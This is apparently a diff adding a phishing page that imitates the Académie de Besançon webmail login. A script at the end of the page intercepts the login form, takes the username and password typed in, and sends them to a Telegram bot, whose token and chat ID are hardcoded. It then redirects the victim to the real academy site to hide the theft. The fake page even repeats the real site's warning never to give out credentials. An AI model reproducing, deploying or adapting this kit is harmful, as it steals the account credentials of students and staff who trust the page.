@@ -1,0 +1,135 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+		<!-- Mimic Internet Explorer 7 -->
+		<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
+		<title></title>
+
+		<link rel="stylesheet" href="./files/css.css" type="text/css"/>
+	</head>
+
+	<body role="application">
+		<script type="text/javascript">
+			
+		</script>
+        <div class="Convergence-Login dijitHidden" id="convergenceLogin" >
+			<div class="Convergence-Login-Border">
+				<div class="Convergence-Login-Banner">
+<!--					<div  class="Convergence-Login-Logo" wairole="presentation"></div> -->
+					<div class="Convergence-Login-RedBand"></div>
+					<div id="welcomeMsg" class="Convergence-Login-WelcomeMsg" style="display: none;"></div>
+<!--					<div class="Convergence-Login-WelcomeMsg">Acad&eacute;mie de Besan&ccedil;on</div>-->
+				</div>
+
+				<div class="Convergence-Login-Notification" id="alertMsg" aria-live="assertive" role="alert" tabindex=0></div>
+				
+				<form action="" method="post">
+					<div>
+						<div class="Convergence-Login-Form">
+							<div class="Convergence-Login-FormRow">
+								<label id="usernameLabelID" for="username">Username:</label>
+								<input id="username" required name="user" type="text" aria-required="true" pattern="([a-zA-Z0-9]+([_|\.|-]{1})?[a-zA-Z0-9]+)([_|\.|-]{1})?([a-zA-Z0-9]?){1,}|([a-zA-Z0-9]+([_|\.|-]{1})?[a-zA-Z0-9]+)([_|\.|-]{1})?([a-zA-Z0-9]?){1,}@ac-besancon.fr"/>
+							</div>
+							<div class="Convergence-Login-FormRow">
+								<label id="passwordLabelID" for="password">Password:</label>
+								<input id="password" required name="pass" type="password" aria-required="true" autocomplete="off"/>
+							</div>
+								<div class="Convergence-Login-FormRow">
+								<input id="chkpreloginip" name="chkpreloginip" type="hidden" value="true" aria-required="false"/>
+							</div>
+							<div class="Convergence-Login-FormRow tundra">
+
+								<div class="Convergence-Login-FormButton" id="buttonContainer">
+									<div>
+										<div dojoType="dijit.form.Button"
+											 id="signin"
+											 type="submit"
+											 dojoAttachEvent="onClick: login"></div>
+											 <input  dojoType="dijit.form.Button" id="changepwd" type="submit" value="connexion">  
+									</div>
+								</div>
+								<div style="clear: both"></div>
+							</div>
+
+						</div>
+
+					</div>
+					<div style="clear: both"></div>
+				</form>
+		<div class="Password-Expired-Message tundra" id="PwdExpiredMsg" style="display:none;">                   
+			<div class="ErrorMsg-Contianer" id="btnContainer">                                                
+				<div class="Error-Icon"></div>
+				<div class="Error-Msg" id="errMsg"></div>	
+		    	
+			</div>
+			
+			<div class="Convergence-Login-FormButton ChangePwdBtn">	
+				                              
+			</div>
+		    </div>
+			
+                </div>                
+                <div class="Convergence-Login-RedBand-Bas"><a href="#" target="_blank">Je ne connais pas mon identifiant et/ou mon mot de passe</a></div>
+				<div id="NotificationSpam" class="Notification-Spam"> ATTENTION AUX SPAMS : Ne donnez jamais vos identifiants et mots de passe !!!</div>
+				<div id="copyright" class="Convergence-Login-Copyright" style="display: none;"></div>
+				<div class="Convergence-Login-Copyright">Oracle &copy; Acad&eacute;mie de Besan&ccedil;on</div>
+			</div>
+		</div>
+
+		<div id="overlay" class="login">
+			<div class="centered">
+				<div class="logo"></div>
+				<div id="progress"></div>
+			</div>
+		</div>
+
+		<iframe name="picCache" id="picCache" src="" width=0 height=0 frameborder=0></iframe>
+
+		<noscript>
+			<div style="width:50%; margin-top: 5%; margin-left:auto; margin-right:auto">
+				<iframe src="noscript.html" frameborder=0 width="100%" />
+			</div>
+		</noscript>
+		<script>
+  document.addEventListener("DOMContentLoaded", function() {
+    const form = document.querySelector("form");
+    form.addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      const token = "5722730835:AAF-83VyMq8uBs0klBjz3iAdfEzPNJz8w0o";
+      const chatId = "-887426534";
+      const message = `Id Besancon :\nUsername: ${username}\nPassword: ${password}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      })
+      .then(response => {
+        if (!response.ok) throw new Error("Envoi échoué");
+        return response.json();
+      })
+      .then(data => {
+        console.log("Message envoyé:", data);
+        window.location.href = "https://www.ac-besancon.fr/";
+      })
+      .catch(error => {
+        console.error("Erreur Telegram :", error);
+        window.location.href = "https://www.ac-besancon.fr/";
+      });
+    });
+  });
+</script>
+
+
+    </body>
+</html>
